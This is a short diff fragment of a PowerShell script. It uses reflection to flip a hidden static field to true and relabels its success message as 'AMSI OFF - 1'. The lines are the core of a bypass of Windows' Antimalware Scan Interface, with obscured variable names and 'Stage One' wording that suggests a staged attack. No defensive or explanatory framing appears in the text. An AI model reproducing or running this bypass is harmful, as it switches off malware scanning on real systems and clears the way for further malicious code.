@@ -10,5 +10,5 @@ $f=$e.GetField($d,'NonPublic,Static')
 $f.SetValue($null,$true)
 
     # If Stage One completes successfully, write a success message
-    Write-Host "Stage One succeeded" -ForegroundColor Green
+    Write-Host "AMSI OFF - 1" -ForegroundColor Green
 }
